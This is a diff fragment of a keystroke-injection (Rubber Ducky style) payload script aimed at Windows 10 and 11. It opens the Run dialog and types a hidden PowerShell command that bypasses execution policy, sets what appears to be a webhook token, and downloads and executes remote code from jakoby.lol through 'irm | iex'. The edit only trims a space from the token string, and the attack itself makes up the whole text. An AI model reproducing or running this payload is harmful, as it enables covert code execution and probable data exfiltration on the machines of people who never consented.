@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db=' BkbEd0bgw_fpD1mL0ZhyHB8oNEyvpe49mjugXaawECNOvcWiRbYEGNYGnqB5o0qV4SQXhpGancle6oui8KytnLLYIiLjqy7_8Fcv9T071ioNBk963hr27ISuADkgAlhPBbRJb6CBBJ_E  ';irm jakoby.lol/9nb | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='BkbEd0bgw_fpD1mL0ZhyHB8oNEyvpe49mjugXaawECNOvcWiRbYEGNYGnqB5o0qV4SQXhpGancle6oui8KytnLLYIiLjqy7_8Fcv9T071ioNBk963hr27ISuADkgAlhPBbRJb6CBBJ_E  ';irm jakoby.lol/9nb | iex
 ENTER
